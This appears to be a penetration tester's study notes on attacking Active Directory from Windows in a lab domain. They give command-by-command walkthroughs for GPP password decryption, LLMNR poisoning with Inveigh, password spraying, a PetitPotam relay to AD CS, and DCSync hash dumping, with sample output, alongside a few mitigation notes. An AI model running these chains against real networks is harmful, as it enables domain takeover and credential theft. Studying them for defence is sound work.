---
title: Attacking Active Directory from Windows
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - active
  - directory
  - ldap
  - linux
---
# Attacking Active Directory from Windows

[Index of Active Directory](active-directory.md)

[Hardening and auditing Active Directory ](hardening-auditing-active-directory.md)

!!! tip "Attacking from linux"
	- [Enumerating Active Directory from Linux](active-directory-from-linux-enumeration.md)
	- [Attacking Active Directory from Linux](active-directory-from-linux-attacks.md)
	- [Lateral Movement in Active Directory from Linux](active-directory-from-linux-lateral-movement.md)
	- [Privileges escalation in Active Directory from Linux](active-directory-from-linux-privilege-escalation.md)

!!! tip "Attacking from Windows"
	- [Enumerating Active Directory from Windows](active-directory-from-windows-enumeration.md)
	- [Active directory: connecting to other hosts](active-directory-connections.md)
	- [Attacking Active Directory from Windows](active-directory-from-windows-attacks.md)
	- [Privileges escalation in Active Directory from Windows](active-directory-from-windows-privilege-escalation.md)

!!! tip "Linux in AD"
	- [Linux in active directory](linux-in-active-directory.md)


## ⛓️ DCShadow

[See https://blog.netwrix.com/2022/09/28/dcshadow_attack/](https://blog.netwrix.com/2022/09/28/dcshadow_attack/)


## 🤐 Group Policy Object Abuse

We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/), among others, to audit the security of GPOs in a domain.

### Powershell

If Group Policy Management Tools are installed on the host we are working from, we can use various built-in [GroupPolicy cmdlets](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps) such as `Get-GPO` to perform the same enumeration.

```powershell
Get-GPO -All | Select DisplayName
```


### Powerview
Using the [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO) function from PowerView, we can get a listing of GPOs by name.

```powershell
Import-Module .\PowerView.ps1
Get-DomainGPO |select displayname
```

Enumerating GPO Names with PowerView

```powershell
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Results:

``` 
ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner

... SNIP ...

```

Converting GPO GUID to Name:

```powershell
Get-GPO -Guid $GUID
# Example:
# Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
# In this case we  can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO. 
```

Checking in BloodHound, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO. If we select the GPO in BloodHound and scroll down to `Affected Objects` on the `Node Info` tab, we can see that this GPO is applied to one OU, which contains four computer objects.

We could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar.

**When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to**.




## 👥 Group Policy Preferences (GPP) Passwords

When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:

- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords.

These files can contain an array of configuration data and defined passwords. The `cpassword` attribute value is AES-256 bit encrypted, but Microsoft [published the AES private key on MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN), which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.

This was patched in 2014 [MS14-025 Vulnerability in GPP could allow elevation of privilege](https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.

In older Windows environments like Server 2003 and 2008, the XML file stores encrypted AES passwords in the “cpassword” parameter that can get decrypted with Microsoft’s public AES key (link). If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:

```bash
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

Locating & Retrieving GPP Passwords with CrackMapExec

```shell-session
crackmapexec smb -L | grep gpp
```

To access the GPP information and decrypt its stored password using CrackMapExec, we can use 2 modules — `**gpp_password**` and `**gpp_autologin**` modules. The `**gpp_password**` decrypts passwords stored in the Group.xml file, while `**gpp_autologin**` retrieves autologin information from the Registry.xml file in the preferences folder.


```bash
crackmapexec smb $domainControllerIP -u $user -p $password -M gpp_autologin
# Example:
# crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

Results:
```
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
```



## 💌 LLMNR/NBT-NS Poisoning

[See more](5355-LLMNR.md). 

[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063(v=technet.10)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails.

If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts.

It uses port `5355` over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port `137` over UDP.

The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with `Responder` to poison these requests.


### How does a typical attack work

1. A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
4. The attacker (us with `Responder` running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.

### Tools

Several tools can be used to attempt LLMNR & NBT-NS poisoning:

|**Tool**|**Description**|
|---|---|
|[Responder](https://github.com/lgandx/Responder)|Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.|
|[Inveigh](https://github.com/Kevin-Robertson/Inveigh)|Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.|
|[Metasploit](https://www.metasploit.com/)|Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.|

### Inveigh

[https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)

Mitre ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), `Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`.

LLMNR & NBT-NS poisoning is possible from a Windows host as well. 

Inveigh is a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool for penetration testers. The repo contains the primary C# version as well as the legacy PowerShell version.

Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth.

#### Powershell version

The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version (in the belowed section).
Configurable parameters in inveigh: [https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters)

```
# Install the module
Import-Module .\Inveigh.ps1

# List parameters
(Get-Command Invoke-Inveigh).Parameters

# Start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file.
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```


#### C# Inveigh (InveighZero)

Before we can use the C# version of the tool, we have to compile the executable. 

```powershell
.\Inveigh.exe
```


Results:

```powershell
[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
[!] Failed to start HTTP listener on port 80, check IP and port usage.
[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 
```


- `[+]`  default option and enabled by default
- `[ ]`  disabled options .

**Console access:** 

Press ESC to enter/exit interactive console. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.

```powershell-session
# List commands
> HELP

# view unique captured hashes
>  GET NTLMV2UNIQUE

#  see which usernames we have collected.
GET NTLMV2USERNAMES
```


## 🪤 NoPac (SamAccountName Spoofing)

!!! tips "Detailed explanations"
	- [noPac: A Tale of Two Vulnerabilities That Could End in Ransomware](https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware).
	- [SAM Name impersonation](https://techcommunity.microsoft.com/users/daniel%20naim/164126).

This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.

[See more on NoPac (Sam account Spoofing)](nopac-sam-account-spoofing.md).


## 🍥 Password spraying

### DomainPasswordSpray

[See DomainPasswordSpray](domainpasswordspray.md)

```powershell-session
Import-Module .\DomainPasswordSpray.ps1

# Authenticated in the domain:
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
# If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.

# Not authenticated in the domain:
Invoke-DomainPasswordSpray -UserList userlist.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### kerbrute

```
./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users  Welcome1
```

### crackmapexec

```powershell
# Spraying password with crackmapexec
crackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +
# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list
# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.
# -H: hash
```


### Mitigation techniques against password spraying

- Multi-factor Authentication	
- Restricting Access
- Reducing Impact of Successful Exploitation
- Password Hygiene

In the Domain Controller’s security log, many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.


## 🍟 PetitPotam (MS-EFSRPC)

! tips ""
	- [NTLM relaying to AD CS - On certificates, printers and a little hippo](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)

PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021. The flaw allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31).

This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted Domain Controller is relayed to the Certificate Authority (CA) host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate.

 This certificate can then be used with a tool such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.


First off, we need to start  [ntlmrelayx.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.

### Step 1: capture the base64 certificate

```bash
# Access the host machine. For instance with ssh
ssh $user@$ip

# Start ntlmrelayx.py
sudo ntlmrelayx.py -debug -smb2support --target http://$hostname.$domain/certsrv/certfnsh.asp --adcs --template DomainController
# Example:
# sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```


In another terminal connected via ssh with the host machine, user  [PetitPotam.py](https://github.com/topotam/PetitPotam).

```bash
git clone https://github.com/topotam/PetitPotam.git
```

```bash
# Run this tool to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running
python3 PetitPotam.py $HostIP $DomainControllerIP       
# Example:
# python3 PetitPotam.py 172.16.5.225 172.16.5.5       
```

In the terminal with the `ntlmrelayx.py`  running we will see the base64 encoded certificate for the Domain Controller if the attack is successful.

### Step 2: Request a TGT

Next step,  we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller:

```bash 
python3 /opt/PKINITtools/gettgtpkinit.py $domain/$host\$ -pfx-base64 $base64EncodedCertificate filename.ccache
# Example:
# python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGS...SNIP...QQIgaSODoMHZaA= dc01.ccache
#  `dc01.ccache` file: The TGT requested above was saved down to this file
```


Set the KRB5CCNAME environment variable, so our attack host uses the `dc01.ccache` file for Kerberos authentication attempts.

```bash
export KRB5CCNAME=filename.ccache
# Example:
# export KRB5CCNAME=dc01.ccache
```

### Step 3: Retrieve NTLM password hashes with DCSync attack

Use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.

```bash
secretsdump.py -just-dc-user $domain/administrator -k -no-pass "$hostName"@$hostName.$domain
# Example:
# secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

We can see this by typing `klist` (using the `klist` command requires installation of the [krb5-user](https://packages.ubuntu.com/focal/krb5-user) package on our attack host. 

```shell-session
klist
# Results:
# Ticket cache: FILE:dc01.ccache
# Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL
# Valid starting       Expires              Service principal
# 04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

Confirming Admin Access to the Domain Controller. Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller:

```bash
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

### Optional path #1: Submit a TGS for ourselves

**Submitting a TGS Request for Ourselves Using getnthash.py**

We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.

```bash
python /opt/PKINITtools/getnthash.py -key $minikerberosTGTHash $domain$/$hostname$
# Example:
# python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
# The $minikerberosTGTHash is obtained from the output of gettgtpkinit.py to request a Ticket-Granting-Ticket (TGT) for the domain controller.
```

**Submitting a TGS Request for Ourselves Using getnthash.py**

```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
```

### Optional path #2: rubeus to generate TGT and TGS

once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.

Setting the KRB5CCNAME Environment Variable


```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$  /certificate:MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEn... SNIP...J4ihw= /ptt
```

We can then type klist to confirm that the ticket is in memory.

```powershell
klist
```

since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host.

```powershell
cd .\mimikatz\x64\
.\mimikatz.exe
lsadump::dcsync /user:inlanefreight\krbtgt
```


### PetitPotam Mitigations

First off, the patch for [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) should be applied to any affected hosts. Below are some further hardening steps that can be taken:

- To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
- Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use.




## 👃 Sniffing LDAP Credentials 

Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a `test connection` function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a `netcat` listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext.


## ❌ Zerologon

[See https://www.crowdstrike.com/en-us/blog/cve-2020-1472-zerologon-security-advisory/.](https://www.crowdstrike.com/en-us/blog/cve-2020-1472-zerologon-security-advisory/)